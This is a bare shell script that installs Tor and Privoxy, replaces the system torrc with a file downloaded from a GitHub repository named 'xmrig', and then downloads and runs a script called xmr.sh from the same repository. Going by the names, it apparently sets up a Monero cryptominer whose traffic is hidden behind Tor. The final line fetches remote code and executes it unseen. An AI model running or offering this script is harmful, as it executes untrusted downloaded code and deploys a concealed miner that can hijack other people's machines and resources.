apt-get update && apt-get upgrade -y && apt update && apt upgrade -y && apt-get install nano -y && apt-get install tor -y && apt-get install privoxy -y
/etc/init.d/tor stop
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc

sudo /etc/init.d/tor stop

sudo rm -rf /etc/tor/torrc
sudo cp torrc /etc/tor/torrc

wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
